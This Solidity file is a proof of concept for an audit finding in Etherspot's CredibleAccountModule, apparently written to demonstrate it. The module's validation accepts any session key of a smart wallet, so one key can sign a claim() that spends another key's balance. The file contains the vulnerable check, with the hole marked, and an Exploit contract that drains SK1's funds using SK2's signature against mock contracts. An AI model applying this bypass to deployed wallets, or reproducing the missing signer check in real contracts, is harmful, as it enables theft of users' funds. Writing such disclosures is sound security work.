// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Etherspot CredibleAccountModule — H-01 (Shieldify)
    validateUserOp accepts any session key of the smart wallet. claim() then
    spends whichever sessionKey is in the calldata. SK2 can sign a claim that
    consumes SK1. _validateSelector and _validateSingleCall are the audited code.
    Commit 9019f2a, CredibleAccountModule.sol lines 759-766.
*/

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

library ExecutionLib {
    function decodeSingle(bytes calldata cd)
        internal
        pure
        returns (address target, uint256 value, bytes calldata execData)
    {
        target = address(bytes20(cd[0:20]));
        value = uint256(bytes32(cd[20:52]));
        execData = cd[52:];
    }
}

contract MockToken {
    string public symbol = "CLAIM";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }
}

contract CredibleAccountModule {
    uint256 internal constant EXEC_OFFSET = 0;

    MockToken public token;
    address public wallet;
    mapping(address => address) public sessionWallet;
    mapping(address => uint256) public sessionBalance;

    constructor(MockToken _token, address _wallet) {
        token = _token;
        wallet = _wallet;
    }

    function setWallet(address _wallet) external {
        wallet = _wallet;
    }

    function addSession(address sessionKey) external {
        sessionWallet[sessionKey] = wallet;
    }

    function credit(address sessionKey, uint256 amount) external {
        sessionBalance[sessionKey] += amount;
    }

    function claim(address sessionKey, address recipient) external {
        require(msg.sender == wallet, "only wallet");
        uint256 amt = sessionBalance[sessionKey];
        sessionBalance[sessionKey] = 0;
        token.transfer(recipient, amt); // @beat:pay
    }

    function _validateSelector(bytes4 _selector) internal pure returns (bytes4) {
        return (_selector == this.claim.selector || _selector == IERC20.approve.selector) ? _selector : bytes4(0); // @beat:selector
    }

    function _validateSingleCall(bytes calldata _callData) internal view returns (bool) {
        (address target,, bytes calldata execData) = ExecutionLib.decodeSingle(_callData[EXEC_OFFSET:]);
        bytes4 selector = _validateSelector(bytes4(execData[0:4]));
        if (selector == bytes4(0)) return false;
        if (selector == IERC20.approve.selector) return true;
        if (target != address(this)) return false; // If not approve call must call this contract
        return true; // @> VULN: claim() is accepted without sessionKey == sessionKeySigner
        // FIX: decode the sessionKey argument and require it equals the signer.
    }

    function validateUserOp(address signer, bytes calldata callData) external view returns (bool) {
        if (sessionWallet[signer] != wallet) return false; // @beat:owns
        return _validateSingleCall(callData);
    }

    function buildClaim(address sessionKey, address recipient) external view returns (bytes memory) {
        bytes memory execData = abi.encodeWithSelector(this.claim.selector, sessionKey, recipient);
        return bytes.concat(bytes20(address(this)), bytes32(uint256(0)), execData);
    }
}

contract SmartWallet {
    CredibleAccountModule public immutable module;

    constructor(CredibleAccountModule _module) {
        module = _module;
    }

    function execute(bytes calldata cd) external {
        (,, bytes calldata execData) = ExecutionLib.decodeSingle(cd);
        (bool ok, bytes memory ret) = address(module).call(execData);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
    }
}

contract Exploit {
    MockToken public token;
    CredibleAccountModule public module;
    SmartWallet public wallet;
    address public sk1;
    address public sk2;
    address public recipient;
    uint256 public constant AMOUNT = 1000 ether;
    bool public validated;

    constructor() {
        token = new MockToken(); // nonce 1
        sk1 = address(0xBEEF);
        sk2 = address(0xCAFE);
        recipient = address(0x2222222222222222222222222222222222222222);
        module = new CredibleAccountModule(token, address(0)); // nonce 2
        wallet = new SmartWallet(module); // nonce 3
    }

    function run() external {
        module.setWallet(address(wallet));
        module.addSession(sk1);
        module.addSession(sk2);
        token.mint(address(module), AMOUNT);
        module.credit(sk1, AMOUNT); // @beat:fund
        bytes memory cd = module.buildClaim(sk1, recipient);
        validated = module.validateUserOp(sk2, cd); // @beat:validate
        require(validated, "SK2 validation passed");
        wallet.execute(cd); // @beat:execute
        require(token.balanceOf(recipient) == AMOUNT, "SK2 took SK1 tokens");
        require(module.sessionBalance(sk1) == 0, "SK1 session consumed");
        require(module.sessionBalance(sk2) == 0, "SK2 had nothing of its own");
    }
}
